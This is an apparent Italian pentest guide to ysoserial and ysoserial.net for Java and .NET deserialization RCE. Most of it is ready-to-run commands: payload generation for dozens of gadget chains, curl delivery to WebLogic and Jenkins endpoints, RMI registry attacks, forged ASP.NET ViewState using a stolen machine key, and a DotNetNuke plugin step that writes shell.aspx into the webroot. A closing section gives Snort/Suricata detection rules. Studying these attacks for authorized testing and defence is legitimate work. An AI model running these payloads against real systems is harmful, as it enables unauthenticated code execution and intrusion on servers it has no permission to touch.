---
title: 'ysoserial: Exploit RCE per Java Deserialization e Gadget'
slug: ysoserial
description: 'Guida completa a ysoserial: tutti i gadget chain Java, ysoserial.net per .NET, URLDNS, payload RCE, detection, hardening e scenari pratici per il pentest.'
image: /ysoserial-java-deserialization-payloads-pentesting.webp
draft: false
date: 2026-02-17T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - ysoserial
  - java deserialization
  - java serialization
  - gadget chains
  - java deserialization exploit
---

# Java Deserialization con ysoserial: gadget chain e payload

La deserializzazione insicura è una delle vulnerabilità più pericolose nelle applicazioni Java e .NET: un attaccante che controlla il flusso di dati serializzati può ottenere **Remote Code Execution** senza autenticazione, sfruttando librerie già presenti nel classpath.

**ysoserial** (Java) e **ysoserial.net** (.NET) sono i tool di riferimento per generare payload di deserializzazione malevoli durante un penetration test autorizzato. Questa guida copre ogni aspetto: dalle fondamenta teoriche a tutti i gadget chain disponibili, dalla generazione del payload alla detection e all'hardening.

***

## Cos'è la [Deserializzazione Insicura](https://hackita.it/articoli/deserialization-attack/)

La **serializzazione** è il processo che converte un oggetto in memoria in un formato trasmissibile (byte stream, JSON, XML, binario). La **deserializzazione** è l'operazione inversa: ricostruisce l'oggetto dai dati ricevuti.

La vulnerabilità nasce quando un'applicazione deserializza dati non trusted — ricevuti da un utente, da una rete, da un cookie, da una coda di messaggi — senza validazione. Un attaccante può iniettare un oggetto artefatto che, durante la deserializzazione, esegue codice arbitrario.

OWASP la classifica nella categoria **A08:2021 - Software and Data Integrity Failures** e ha una propria entry storica come OWASP Top 10 2017 A8.

### Superfici di Attacco Tipiche

| Vettore                                                        | Protocollo / Tecnologia                            |
| -------------------------------------------------------------- | -------------------------------------------------- |
| Cookie di sessione                                             | Java serialization base64, ViewState ASP.NET       |
| Parametri HTTP POST                                            | JSON, XML, binario custom                          |
| RMI / JNDI                                                     | Java RMI Registry, JNDI over LDAP/RMI              |
| Message broker                                                 | JMS (ActiveMQ, WebLogic), RabbitMQ                 |
| [File upload](https://hackita.it/articoli/file-upload-attack/) | Payload serializzati travestiti da file            |
| API REST/SOAP                                                  | Classi annotate con `@JsonTypeInfo`, XmlSerializer |
| Cache distribuita                                              | Redis, Memcached, Hazelcast                        |

***

## Come Funziona Java Serialization

Quando Java serializza un oggetto, il byte stream inizia sempre con gli stessi **4 byte**:

```
AC ED 00 05
```

Questo header è il fingerprint universale che identifica un oggetto Java serializzato nel traffico di rete, nei parametri HTTP e nei file. Codificato in Base64 il valore diventa `rO0AB`.

Il processo sfrutta il metodo `readObject()` della JVM: se una classe implementa `readObject()` in modo unsafe, qualsiasi codice definito in quel metodo viene eseguito durante la deserializzazione — prima di qualsiasi controllo autorizzativo.

### Gadget Chain: la Teoria

Un **gadget chain** è una sequenza di classi già presenti nel classpath dell'applicazione (librerie di terze parti, framework) che, collegate tra loro in modo particolare, portano all'esecuzione di un comando arbitrario durante la deserializzazione.

Non serve avere vulnerabilità nelle librerie stesse: basta che siano nel classpath e che contengano metodi come `readObject()`, getter/setter o callback che ysoserial può sfruttare.

La scoperta di queste chain è stata formalizzata da **Gabriel Lawrence e Chris Frohoff** nel loro talk *"Marshalling Pickles"* (AppSec 2015), da cui nasce ysoserial.

***

## ysoserial: Installazione e Utilizzo

**Repository ufficiale:** [frohoff/ysoserial](https://github.com/frohoff/ysoserial)

### Build da Sorgente

```bash
# Requisiti: Java 1.7+, Maven 3.x+
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn clean package -DskipTests
# Output: target/ysoserial-all.jar
```

### Download Diretto

```bash
# Release pre-compilata
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```

### Sintassi Base

```bash
# Sintassi generale
java -jar ysoserial.jar [GadgetChain] '[comando]'

# Output su file binario
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin

# Output base64 diretto
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64

# Lista tutti i gadget disponibili
java -jar ysoserial.jar
```

### Invio del Payload via curl

```bash
# POST con payload binario
curl -s -X POST http://target:8080/endpoint \
  --data-binary @payload.bin \
  -H "Content-Type: application/x-java-serialized-object"

# Parametro base64 in un form
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0)
curl -s -X POST http://target:8080/app \
  -d "data=${PAYLOAD}"
```

***

## Tutti i Gadget Chain Java

ysoserial include **34 gadget chain**. Ogni chain richiede che la libreria corrispondente sia presente nel classpath del target.

| Gadget Chain            | Autore/i                               | Dipendenza Richiesta                                                                                                                                                                                 |
| ----------------------- | -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **AspectJWeaver**       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                       |
| **BeanShell1**          | @pwntester, @cschneider4711            | bsh:2.0b5                                                                                                                                                                                            |
| **C3P0**                | @mbechler                              | c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                            |
| **Click1**              | @artsploit                             | click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                          |
| **Clojure**             | @JackOfMostTrades                      | clojure:1.8.0                                                                                                                                                                                        |
| **CommonsBeanutils1**   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                                |
| **CommonsCollections1** | @frohoff                               | commons-collections:3.1                                                                                                                                                                              |
| **CommonsCollections2** | @frohoff                               | commons-collections4:4.0                                                                                                                                                                             |
| **CommonsCollections3** | @frohoff                               | commons-collections:3.1                                                                                                                                                                              |
| **CommonsCollections4** | @frohoff                               | commons-collections4:4.0                                                                                                                                                                             |
| **CommonsCollections5** | @matthias\_kaiser, @jasinner           | commons-collections:3.1                                                                                                                                                                              |
| **CommonsCollections6** | @matthias\_kaiser                      | commons-collections:3.1                                                                                                                                                                              |
| **CommonsCollections7** | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1                                                                                                                                                                              |
| **FileUpload1**         | @mbechler                              | commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                             |
| **Groovy1**             | @frohoff                               | groovy:2.3.9                                                                                                                                                                                         |
| **Hibernate1**          | @mbechler                              | (nessuna dipendenza esterna)                                                                                                                                                                         |
| **Hibernate2**          | @mbechler                              | (nessuna dipendenza esterna)                                                                                                                                                                         |
| **JBossInterceptors1**  | @matthias\_kaiser                      | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                             |
| **JRMPClient**          | @mbechler                              | (nessuna dipendenza esterna)                                                                                                                                                                         |
| **JRMPListener**        | @mbechler                              | (nessuna dipendenza esterna)                                                                                                                                                                         |
| **JSON1**               | @mbechler                              | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |
| **JavassistWeld1**      | @matthias\_kaiser                      | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                         |
| **Jdk7u21**             | @frohoff                               | (nessuna dipendenza esterna — sfrutta JDK ≤7u21)                                                                                                                                                     |
| **Jython1**             | @pwntester, @cschneider4711            | jython-standalone:2.5.2                                                                                                                                                                              |
| **MozillaRhino1**       | @matthias\_kaiser                      | js:1.7R2                                                                                                                                                                                             |
| **MozillaRhino2**       | @\_tint0                               | js:1.7R2                                                                                                                                                                                             |
| **Myfaces1**            | @mbechler                              | (nessuna dipendenza esterna — Apache MyFaces)                                                                                                                                                        |
| **Myfaces2**            | @mbechler                              | (nessuna dipendenza esterna — Apache MyFaces)                                                                                                                                                        |
| **ROME**                | @mbechler                              | rome:1.0                                                                                                                                                                                             |
| **Spring1**             | @frohoff                               | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                                |
| **Spring2**             | @mbechler                              | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                            |
| **URLDNS**              | @gebl                                  | (nessuna dipendenza esterna)                                                                                                                                                                         |
| **Vaadin1**             | @kai\_ullrich                          | vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                           |
| **Wicket1**             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4                                                                                                                                                                  |

### I Chain più Comuni in Ambiente Reale

**CommonsCollections1–7** sono le chain più diffuse nei vecchi middleware Java (WebLogic, JBoss, WebSphere, Jenkins). Se trovi Apache Commons Collections nel classpath, prova sempre dalla CC1 in su.

**CommonsBeanutils1** è il gadget storico di Jenkins (\<2.319) e rimane il più affidabile su ambienti che usano BeanUtils senza CC direttamente.

**Spring1/2** colpisce applicazioni Spring Framework con versioni vecchie dei bean processor.

**Jdk7u21** non richiede librerie esterne: sfrutta una classe interna del JDK ≤7u21. Utile quando non riesci a fingerprint le librerie presenti.

***

## URLDNS: il Gadget da SSRF a RCE

**URLDNS** è un gadget chain speciale: non esegue comandi, ma causa una **DNS lookup** verso un host controllato dall'attaccante.

Questo lo rende il gadget ideale per verificare se il target è vulnerabile alla deserializzazione insicura **senza bisogno di librerie esterne** (funziona su qualsiasi JVM, usa solo classi native del JDK).

### Utilizzo in Fase di Riconoscimento

```bash
# Genera payload URLDNS con il tuo Burp Collaborator o interactsh
java -jar ysoserial.jar URLDNS 'http://yourid.oast.fun' > urldns.bin

# Invia il payload al parametro sospetto
curl -s -X POST http://target:8080/api/deserialize \
  --data-binary @urldns.bin \
  -H "Content-Type: application/x-java-serialized-object"
```

Se ricevi una richiesta DNS su `yourid.oast.fun`, il target è vulnerabile a deserializzazione insicura.

### Perché URLDNS è Sicuro da Testare

1. **No side effects**: non esegue comandi, non modifica file.
2. **No dipendenze**: funziona su ogni JDK.
3. **Rilevamento SSRF**: puoi verificare la raggiungibilità della rete interna dal server.
4. **Out-of-band confirmation**: il DNS callback arriva anche quando l'applicazione non restituisce output (blind RCE scenario).

### Flusso URLDNS → RCE

```
URLDNS payload → DNS callback ricevuto
       ↓
Conferma: endpoint deserializza oggetti Java
       ↓
Fingerprint librerie nel classpath (header server, JAR nel WAR, errori stack trace)
       ↓
Seleziona gadget chain appropriata (es. CommonsCollections1)
       ↓
Genera payload con comando di reconnaissance (whoami, id, hostname)
       ↓
RCE confermata → escalation
```

### Interactsh per URLDNS in CTF e Lab

```bash
# Avvia listener interactsh locale
interactsh-client

# Oppure usa il server pubblico Burp Collaborator (Burp Suite Pro)
# o canary tokens: https://canarytokens.org/generate
```

***

## RMI e JRMPClient/JRMPListener

**JRMPClient** e **JRMPListener** sono gadget per sfruttare endpoint **Java RMI** (Remote Method Invocation).

### JRMPListener: Avvia un Server RMI Malevolo

```bash
# Avvia il server JRMP listener sulla porta 1099
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'id'
```

### JRMPClient: Trigger verso il Server JRMP

```bash
# Genera payload che punta al tuo server JRMP
java -jar ysoserial.jar JRMPClient '10.10.14.5:1099' > jrmp.bin
```

### RMIRegistryExploit: Attacca Direttamente il Registry

```bash
# Attacca un RMI registry esposto sulla porta 1099
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit \
  10.10.11.50 1099 CommonsCollections1 'id'
```

Questa tecnica è usata su target con **JBoss**, **WebLogic** (pre-patch CVE-2015-4852) e servizi custom che espongono RMI.

***

## ysoserial.net: Deserializzazione .NET

**ysoserial.net** è il port per .NET della stessa filosofia: genera payload serializzati che sfruttano gadget chain nelle librerie .NET per ottenere RCE tramite i serializzatori insicuri del framework.

**Repository ufficiale:** [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)

### Build

```powershell
# Windows - Visual Studio o msbuild
git clone https://github.com/pwntester/ysoserial.net.git
cd ysoserial.net
msbuild ysoserial.net.sln /p:Configuration=Release
# Output: ysoserial.net/bin/Release/ysoserial.exe
```

### Sintassi Base ysoserial.net

```powershell
# Generale
.\ysoserial.exe -g [Gadget] -f [Formatter] -c "[comando]" -o [output]

# Esempio: Json.NET + ObjectDataProvider, output raw, test locale
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t

# Esempio: BinaryFormatter + PSObject, output base64
.\ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "whoami"

# Output hex
.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o hex -c "whoami"

# Minify + rimuovi type info extra
.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c "whoami" --minify --ust

# Cerca tutti i gadget compatibili con un formatter
.\ysoserial.exe --sf BinaryFormatter

# Esegui tutti i gadget per un formatter (test massivo)
.\ysoserial.exe --raf -f Json.Net -c "calc" -t
```

### Output Formats

| Flag                  | Formato                 |
| --------------------- | ----------------------- |
| `-o raw`              | Byte stream grezzo      |
| `-o base64`           | Base64 standard         |
| `-o base64-urlencode` | Base64 URL-safe encoded |
| `-o raw-urlencode`    | Raw URL-encoded         |
| `-o hex`              | Hex string              |

***

## Gadget Chain .NET: Tutti i Gadget

| Gadget                                | Formatter Compatibili                                                                                                                                                                                         | Note                                                          |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| **ActivitySurrogateDisableTypeCheck** | BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter                                                                                                                                       | `--var 1/2`; disabilita controllo tipo, comando ignorato      |
| **ActivitySurrogateSelector**         | BinaryFormatter (2), LosFormatter, SoapFormatter                                                                                                                                                              | `--var 1/2`; comando ignorato                                 |
| **ActivitySurrogateSelectorFromFile** | BinaryFormatter (2), LosFormatter, SoapFormatter                                                                                                                                                              | `--var 1/2`                                                   |
| **AxHostState**                       | BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter                                                                                                                                       | —                                                             |
| **BaseActivationFactory**             | Json.NET                                                                                                                                                                                                      | Richiede .NET 5/6/7 con WPF                                   |
| **ClaimsIdentity**                    | BinaryFormatter, LosFormatter, SoapFormatter                                                                                                                                                                  | —                                                             |
| **ClaimsPrincipal**                   | BinaryFormatter, LosFormatter, SoapFormatter                                                                                                                                                                  | —                                                             |
| **DataSet**                           | BinaryFormatter, LosFormatter, SoapFormatter                                                                                                                                                                  | —                                                             |
| **DataSetOldBehaviour**               | BinaryFormatter, LosFormatter                                                                                                                                                                                 | `--spoofedAssembly`                                           |
| **DataSetOldBehaviourFromFile**       | BinaryFormatter, LosFormatter                                                                                                                                                                                 | `--spoofedAssembly`                                           |
| **DataSetTypeSpoof**                  | BinaryFormatter, LosFormatter, SoapFormatter                                                                                                                                                                  | —                                                             |
| **GenericPrincipal**                  | BinaryFormatter, LosFormatter                                                                                                                                                                                 | `--var 1/2`                                                   |
| **GetterCompilerResults**             | Json.NET                                                                                                                                                                                                      | `--var 1-4`                                                   |
| **GetterSecurityException**           | Json.NET                                                                                                                                                                                                      | `--var 1-4`                                                   |
| **GetterSettingsPropertyValue**       | Json.NET, MessagePackTypeless, MessagePackTypelessLz4, Xaml                                                                                                                                                   | `--var 1-4`                                                   |
| **ObjectDataProvider**                | DataContractSerializer, FastJson, FsPickler, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml, XmlSerializer, YamlDotNet \< 5.0.0 | Gadget più universale .NET                                    |
| **ObjRef**                            | BinaryFormatter, LosFormatter, ObjectStateFormatter, SoapFormatter                                                                                                                                            | —                                                             |
| **PSObject**                          | BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter                                                                                                                                       | —                                                             |
| **ResourceSet**                       | BinaryFormatter, LosFormatter, NetDataContractSerializer                                                                                                                                                      | `--ig 1/2`; non standalone                                    |
| **RolePrincipal**                     | BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter                                                                                                     | —                                                             |
| **SessionSecurityToken**              | BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter                                                                                                     | —                                                             |
| **SessionViewStateHistoryItem**       | BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter                                                                                                     | —                                                             |
| **TextFormattingRunProperties**       | BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter                                                                                                     | `--xamlurl`, `--hasRootDCS`                                   |
| **ToolboxItemContainer**              | BinaryFormatter, LosFormatter, SoapFormatter                                                                                                                                                                  | —                                                             |
| **TypeConfuseDelegate**               | BinaryFormatter, LosFormatter, NetDataContractSerializer                                                                                                                                                      | —                                                             |
| **TypeConfuseDelegateMono**           | BinaryFormatter, LosFormatter, NetDataContractSerializer                                                                                                                                                      | Versione Mono                                                 |
| **WindowsClaimsIdentity**             | BinaryFormatter (3), DataContractSerializer (2), Json.NET (2), LosFormatter (3), NetDataContractSerializer (3), SoapFormatter (2)                                                                             | `--var 1/2/3`; richiede Microsoft.IdentityModel.Claims        |
| **WindowsIdentity**                   | BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter                                                                                                     | —                                                             |
| **WindowsPrincipal**                  | BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter                                                                         | —                                                             |
| **XamlAssemblyLoadFromFile**          | BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter                                                                                                                                       | `--var 1/2`                                                   |
| **XamlImageInfo**                     | Json.NET                                                                                                                                                                                                      | `--var 1/2`; variante 2 richiede Microsoft.Web.Deployment.dll |

### ObjectDataProvider: il Gadget Universale .NET

**ObjectDataProvider** è il gadget più utilizzato perché funziona con quasi tutti i formatter. Sfrutta `System.Windows.Data.ObjectDataProvider` di WPF per eseguire metodi arbitrari durante la deserializzazione.

```powershell
# Json.NET + ObjectDataProvider
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "whoami" -t

# XmlSerializer + ObjectDataProvider
.\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -o raw -c "whoami" -t

# YamlDotNet (versione < 5.0.0)
.\ysoserial.exe -f YamlDotNet -g ObjectDataProvider -o raw -c "whoami" -t
```

***

## Formatter .NET: la Chiave della Vulnerabilità

In .NET la vulnerabilità è legata al **formatter** che l'applicazione usa per deserializzare. Ogni formatter ha un comportamento diverso.

| Formatter                     | Rischio    | Contesto Tipico                                  |
| ----------------------------- | ---------- | ------------------------------------------------ |
| **BinaryFormatter**           | 🔴 Critico | Legacy ASP.NET, remoting, ViewState non protetto |
| **LosFormatter**              | 🔴 Critico | ViewState ASP.NET WebForms                       |
| **SoapFormatter**             | 🔴 Critico | Remoting .NET Framework, SOAP/WCF legacy         |
| **NetDataContractSerializer** | 🔴 Critico | WCF con tipi dinamici                            |
| **ObjectStateFormatter**      | 🔴 Critico | Session state ASP.NET non firmato                |
| **DataContractSerializer**    | 🟠 Alto    | WCF, può essere sicuro con `knownTypes`          |
| **Json.NET**                  | 🟠 Alto    | Solo con `TypeNameHandling != None`              |
| **JavaScriptSerializer**      | 🟠 Alto    | ASP.NET Web API legacy con `__type`              |
| **XmlSerializer**             | 🟠 Alto    | Con tipi derivati non controllati                |
| **YamlDotNet**                | 🟡 Medio   | Solo versioni \< 5.0.0                           |
| **FastJson**                  | 🟡 Medio   | Con decode type abilitato                        |
| **SharpSerializerBinary/Xml** | 🟡 Medio   | Con tipo non controllato                         |

***

## Plugin ysoserial.net

I plugin estendono ysoserial.net per attacchi specifici su applicazioni note.

### DotNetNuke (CVE-2017-9822)

```powershell
# Esegui comando
.\ysoserial.exe -p DotNetNuke -m run_command -c "whoami"

# Leggi file
.\ysoserial.exe -p DotNetNuke -m read_file -f "C:\Windows\win.ini"

# Scrivi file
.\ysoserial.exe -p DotNetNuke -m write_file -f "C:\inetpub\wwwroot\shell.aspx" -c "[contenuto]"
```

### SharePoint

```powershell
# CVE-2018-8421
.\ysoserial.exe -p SharePoint --cve CVE-2018-8421 -c "whoami"

# CVE-2019-0604
.\ysoserial.exe -p SharePoint --cve CVE-2019-0604 -c "whoami"

# CVE-2020-1147
.\ysoserial.exe -p SharePoint --cve CVE-2020-1147 -c "whoami"
```

### ViewState (ASP.NET WebForms)

Il plugin ViewState genera payload per attaccare il meccanismo di ViewState di ASP.NET quando la `__VIEWSTATE` non è firmata correttamente o quando la chiave è nota/recuperabile.

```powershell
# ViewState con chiave nota (MAC bypass)
.\ysoserial.exe -p ViewState \
  -g ActivitySurrogateSelector \
  -c "whoami" \
  --apppath "/" \
  --vk "your-validationkey-hex"

# ViewState senza chiave (legacy .NET 2.0-3.5)
.\ysoserial.exe -p ViewState \
  -g TypeConfuseDelegate \
  -c "whoami" \
  --islegacy

# Esempi di utilizzo
.\ysoserial.exe -p ViewState --examples
```

### MachineKeySessionSecurityTokenHandler

```powershell
# Sfrutta il token handler con chiave macchina nota o estratta
.\ysoserial.exe -p MachineKeySessionSecurityTokenHandler \
  -c "whoami" \
  --vk "validationkey" \
  --ek "encryptionkey"
```

### Altserialization

```powershell
# HttpStaticObjectsCollection
.\ysoserial.exe -p Altserialization -M HttpStaticObjectsCollection -c "whoami"

# SessionStateItemCollection
.\ysoserial.exe -p Altserialization -M SessionStateItemCollection -c "whoami"
```

### Resx

```powershell
# Genera file RESX malevolo
.\ysoserial.exe -p Resx -M BinaryFormatter -c "whoami"
```

***

## Identificare la Vulnerabilità durante il Pentest

### Fase 1: Riconoscimento dei Parametri Sospetti

Cerca nell'applicazione parametri che accettano dati binari, base64 o oggetti serializzati.

```bash
# Cerca nei cookie
curl -v http://target/ 2>&1 | grep -i "set-cookie"

# Cerca header/parametri con base64 sospetto
# Decodifica e controlla i primi byte
echo "rO0ABXNyADJzdW4ubWlzYy5KREsxMjNBQkM..." | base64 -d | xxd | head -2
# Se vedi "ac ed 00 05" --> oggetto Java serializzato
```

### Magic Bytes per Identificare il Tipo di Payload

Questo è ciò che i tool di detection (Burp Suite, Wireshark, IDS) cercano per identificare oggetti serializzati nel traffico:

| Tecnologia             | Magic Bytes (Hex)            | Base64 Header     |
| ---------------------- | ---------------------------- | ----------------- |
| Java Serialized Object | `AC ED 00 05`                | `rO0AB`           |
| .NET BinaryFormatter   | `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////`    |
| .NET SoapFormatter     | (XML: `<SOAP-ENV:Envelope`)  | —                 |
| Python Pickle          | `80 02` / `80 04` / `80 05`  | `gASV`            |
| PHP Serialized         | `a:`, `O:`, `s:`             | (testo leggibile) |

### [Burp Suite](https://hackita.it/articoli/burp-suite/): Identificazione Automatica

In Burp Suite, usa l'estensione **Java Deserialization Scanner** o cerca manualmente:

1. **Proxy → HTTP History**: filtra per request con content-type `application/x-java-serialized-object`
2. **Search** (Ctrl+F): cerca `rO0AB` nelle request interceptate
3. **Intruder/Repeater**: modifica il parametro sospetto con il payload generato da ysoserial

```
# Regola Burp Proxy match&replace per evidenziare:
Match: rO0AB
Replace: [JAVA-DESERIALIZATION]
```

### [Nmap](https://hackita.it/articoli/nmap/): Fingerprint Servizi RMI e JMX

```bash
# Scansiona RMI e JMX
nmap -sV -p 1099,1090,1098,4444,4445,8686,11099 target

# NSE per RMI
nmap -p 1099 --script rmi-dumpregistry target

# JMX
nmap -p 9010 --script jmx-info target
```

### ysoserial URLDNS come Probe Iniziale

```bash
# Genera probe DNS
java -jar ysoserial.jar URLDNS 'http://UNIQUEID.yourdomain.com' > probe.bin

# Invia al parametro sospetto
curl -s -X POST http://target/deserialize \
  --data-binary @probe.bin \
  -H "Content-Type: application/x-java-serialized-object"

# Verifica DNS callback nel tuo listener (interactsh, Burp Collaborator)
```

### Gadget Detection con Burp Deserialization Scanner

```
1. Installa "Java Deserialization Scanner" in Burp Extensions
2. Seleziona la request con il parametro sospetto
3. Extensions → Java Deserialization Scanner → Active Scan
4. Il plugin testa automaticamente tutti i gadget disponibili
5. Con Burp Collaborator: detection out-of-band via DNS/HTTP
```

***

## Tre Scenari Pratici di Attacco

### Scenario 1: Apache Commons Collections su WebLogic (Hack The Box / Lab Locale)

**Contesto:** WebLogic Server 10.3.6 esposto sulla porta 7001. L'endpoint `/wls-wsat/CoordinatorPortType` accetta payload SOAP che vengono deserializzati.

```bash
# Step 1: Verifica se l'endpoint è raggiungibile
curl -s -o /dev/null -w "%{http_code}" \
  http://10.10.11.50:7001/wls-wsat/CoordinatorPortType

# Step 2: Probe con URLDNS
java -jar ysoserial.jar URLDNS 'http://probe.yourdomain.com' > probe.bin
curl -s -X POST http://10.10.11.50:7001/wls-wsat/CoordinatorPortType \
  --data-binary @probe.bin \
  -H "Content-Type: application/octet-stream"

# Step 3: DNS callback ricevuto → conferma deserializzazione
# Ora fingerprint il classpath tramite errori dello stack trace

# Step 4: Prova CommonsCollections1 (comune in WebLogic con CC 3.x)
java -jar ysoserial.jar CommonsCollections1 'id' > cc1.bin
curl -s -X POST http://10.10.11.50:7001/wls-wsat/CoordinatorPortType \
  --data-binary @cc1.bin \
  -H "Content-Type: application/octet-stream"

# Step 5: Se nessun output, prova CC2 con CC4
java -jar ysoserial.jar CommonsCollections2 'id' > cc2.bin
```

**Riferimenti CVE rilevanti:** CVE-2015-4852, CVE-2016-3510, CVE-2017-3248, CVE-2019-2725 (tutti WebLogic deserialization).

***

### Scenario 2: Jenkins CommonsBeanutils1 (CTF / Ambienti di Test)

**Contesto:** Jenkins versione \< 2.319 esposto sulla porta 8080. Il CLI di Jenkins usa Java serialization per la comunicazione. Confermata presenza di `commons-beanutils` nel classpath.

```bash
# Step 1: Identifica versione Jenkins
curl -s -I http://10.10.11.60:8080/ | grep -i "x-jenkins"

# Step 2: Accesso al CLI endpoint
curl -s http://10.10.11.60:8080/cli -H "Session: xxx" -H "Side: download"

# Step 3: Genera payload CommonsBeanutils1
java -jar ysoserial.jar CommonsBeanutils1 'whoami' > jenkins_cb1.bin

# Step 4: Invia tramite il canale CLI
# (ysoserial include un exploit wrapper per Jenkins CLI)
java -jar ysoserial.jar \
  -cp ysoserial.jar ysoserial.exploit.JenkinsCLI \
  http://10.10.11.60:8080/ CommonsBeanutils1 'whoami'
```

***

### Scenario 3: ASP.NET ViewState con Machine Key Nota (Web App Pentest)

**Contesto:** Applicazione ASP.NET WebForms. La Machine Key è stata recuperata da un file `web.config` esposto via [directory traversal](https://hackita.it/articoli/path-traversal/) o da un [backup esposto](https://hackita.it/articoli/backup-exposure/).

```powershell
# Step 1: Recupera la Machine Key dal web.config esposto
curl http://target/backup/web.config | grep -i "machineKey"
# <machineKey validationKey="..." decryptionKey="..." validation="SHA1"/>

# Step 2: Genera ViewState payload con la chiave nota
.\ysoserial.exe -p ViewState `
  -g TextFormattingRunProperties `
  -c "whoami" `
  --apppath "/" `
  --islegacy `
  --vk "AAAABBBBCCCCDDDD..." `  # la validationKey estratta

# Step 3: Intercetta una request con Burp, sostituisci __VIEWSTATE
# con il valore base64 generato

# Step 4: Invia la request modificata
# Se l'output del comando appare nella response o in un side channel,
# la vulnerabilità è confermata

# Step 5: Cerca machine key anche in:
# - IIS Manager export
# - web.config.bak, web.config.old
# - Errori YSOD che includono config details
# - Azure App Service Kudu /api/vfs/site/wwwroot/web.config
```

***

## Attack Chain Completa

| Fase                   | Azione                                                                   | Tool                                                                                                                   |
| ---------------------- | ------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------- |
| **Reconnaissance**     | Fingerprint versioni middleware, header server, endpoint esposti         | Nmap, Burp Suite                                                                                                       |
| **Detection**          | Identifica parametri con dati serializzati (magic bytes, base64 `rO0AB`) | Burp, xxd, grep                                                                                                        |
| **SSRF/DNS Probe**     | URLDNS payload per confermare deserializzazione senza side effects       | ysoserial, interactsh                                                                                                  |
| **Classpath Enum**     | Analisi stack trace, JAR nel WAR, `/WEB-INF/lib/`, Maven pom.xml         | curl, directory enum                                                                                                   |
| **Gadget Selection**   | Selezione gadget chain in base alle librerie confermate                  | ysoserial lista gadget                                                                                                 |
| **Payload Generation** | Generazione payload con comando di reconnaissance                        | ysoserial, ysoserial.net                                                                                               |
| **Delivery**           | Invio payload via HTTP POST, RMI, JMX, cookie, upload                    | curl, Burp Repeater                                                                                                    |
| **Execution Confirm**  | Verifica esecuzione (output, DNS, HTTP callback)                         | interactsh, Burp Collab                                                                                                |
| **Post-Exploitation**  | Escalation, lateral movement, pivot                                      | [Post-Exploitation](https://hackita.it/articoli/post-exploitation/), [Pivoting](https://hackita.it/articoli/pivoting/) |

***

## Detection e Evasion

### Blue Team: Cosa Monitorare

#### Snort/Suricata: Rileva Payload Java Serializzati

```
# Snort rule: Java serialized object in HTTP body
alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (
  msg:"JAVA Deserialization Payload Detected";
  flow:to_server,established;
  content:"|AC ED 00 05|";
  depth:4;
  classtype:attempted-user;
  sid:9000001; rev:1;
)

# Suricata: base64-encoded Java serialized object
alert http any any -> $HTTP_SERVERS any (
  msg:"HTTP Java Serialized Object base64 (rO0AB)";
  flow:to_server,established;
  http.request_body;
  content:"rO0AB";
  classtype:attempted-user;
  sid:9000002; rev:1;
)
```

#### Snort/Suricata: Rileva Payload .NET BinaryFormatter

```
# .NET BinaryFormatter magic bytes
alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (
  msg:".NET BinaryFormatter Deserialization Payload";
  flow:to_server,established;
  content:"|00 01 00 00 00 FF FF FF FF|";
  depth:9;
  classtype:attempted-user;
  sid:9000003; rev:1;
)
```

